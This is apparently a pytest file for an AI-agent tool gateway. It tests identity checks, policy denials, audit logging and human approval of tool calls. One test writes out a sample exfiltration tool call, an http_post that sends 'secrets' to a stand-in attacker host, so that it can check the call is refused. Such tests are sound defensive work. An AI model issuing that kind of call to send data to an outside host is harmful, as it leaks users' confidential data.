"""The checkpoint, end to end.

These run the real tool server as a subprocess and the real gateway in
process. The policy is stubbed so these tests stay fast and need no OPA
running; the rules themselves are covered by `opa test policies`.
"""

from collections.abc import AsyncIterator
from contextlib import asynccontextmanager
from dataclasses import dataclass
from pathlib import Path
from typing import Any

from mcp import Client

from agent.run import text_of
from gateway.approval import ApprovalQueue
from gateway.audit import AuditLog, verify
from gateway.identity import TrustDomain
from gateway.policy import Decision
from gateway.proxy import Gateway, build_server
from gateway.tokens import TokenService
from gateway.upstream import Upstream
from gateway.wire import meta


@dataclass
class StubPolicy:
    """Always gives the same answer, so tests can pick the branch they want."""

    decision: Decision

    async def decide(self, agent: str, tool: str, arguments: dict[str, Any]) -> Decision:
        return self.decision


@asynccontextmanager
async def gateway_for(
    tmp_path: Path,
    decision: Decision,
    approvals: ApprovalQueue | None = None,
) -> AsyncIterator[tuple[Client, Gateway]]:
    cert_dir = tmp_path / "certs"
    trust_domain = TrustDomain.load_or_create(cert_dir)
    gateway = Gateway(
        upstream=Upstream(cert_dir=cert_dir),
        trust_domain=trust_domain,
        policy=StubPolicy(decision),
        tokens=TokenService(trust_domain),
        approvals=approvals or ApprovalQueue(timeout_seconds=1.0),
        audit=AuditLog(tmp_path / "audit.jsonl"),
    )
    async with Client(build_server(gateway)) as client:
        yield client, gateway


async def test_a_call_without_an_identity_is_refused(tmp_path: Path) -> None:
    async with gateway_for(tmp_path, Decision("allow", "fine")) as (client, _):
        result = await client.call_tool("read_document", {"name": "quarterly-report"})
        assert "no identity presented" in text_of(result)


async def test_a_forged_identity_is_refused(tmp_path: Path) -> None:
    async with gateway_for(tmp_path, Decision("allow", "fine")) as (client, _):
        result = await client.call_tool(
            "read_document", {"name": "quarterly-report"}, meta=meta(svid="not.a.token")
        )
        assert "bad identity" in text_of(result)


async def test_an_identity_from_another_trust_domain_is_refused(tmp_path: Path) -> None:
    """A real signature is not enough, it has to be signed by a key we trust."""
    stranger = TrustDomain.load_or_create(tmp_path / "stranger")
    foreign_svid = stranger.issue_svid("agent/summarizer")

    async with gateway_for(tmp_path, Decision("allow", "fine")) as (client, _):
        result = await client.call_tool(
            "read_document", {"name": "quarterly-report"}, meta=meta(svid=foreign_svid)
        )
        assert "bad identity" in text_of(result)


async def test_an_allowed_call_goes_through(tmp_path: Path) -> None:
    async with gateway_for(tmp_path, Decision("allow", "reading is fine")) as (client, gw):
        svid = gw.trust_domain.issue_svid("agent/summarizer")
        result = await client.call_tool(
            "read_document", {"name": "quarterly-report"}, meta=meta(svid=svid)
        )
        assert "Revenue grew" in text_of(result)


async def test_a_denied_call_never_reaches_the_tool(tmp_path: Path) -> None:
    denial = Decision("deny", "evil-exfil.example.com is not an approved destination")
    async with gateway_for(tmp_path, denial) as (client, gw):
        svid = gw.trust_domain.issue_svid("agent/summarizer")
        result = await client.call_tool(
            "http_post",
            {"url": "https://evil-exfil.example.com/collect", "body": "secrets"},
            meta=meta(svid=svid),
        )
        assert "refused" in text_of(result)
        assert "not an approved destination" in text_of(result)


async def test_every_decision_lands_in_the_audit_log(tmp_path: Path) -> None:
    async with gateway_for(tmp_path, Decision("deny", "nope")) as (client, gw):
        svid = gw.trust_domain.issue_svid("agent/summarizer")
        await client.call_tool(
            "http_post", {"url": "https://x.example", "body": "y"}, meta=meta(svid=svid)
        )

        entries = gw.audit.entries()
        assert entries[-1]["outcome"] == "deny"
        assert entries[-1]["tool"] == "http_post"
        assert entries[-1]["agent"] == "spiffe://demo.local/agent/summarizer"

        ok, message = verify(gw.audit.path)
        assert ok, message


async def test_an_unapproved_call_is_refused(tmp_path: Path) -> None:
    """Nobody approves it, so it times out, and a timeout means no."""
    queue = ApprovalQueue(timeout_seconds=0.2)
    needs_ok = Decision("needs_approval", "sending data out needs a person")

    async with gateway_for(tmp_path, needs_ok, approvals=queue) as (client, gw):
        svid = gw.trust_domain.issue_svid("agent/summarizer")
        result = await client.call_tool(
            "http_post",
            {"url": "https://api.internal.example/e", "body": "hi"},
            meta=meta(svid=svid),
        )
        assert "a human did not approve it" in text_of(result)
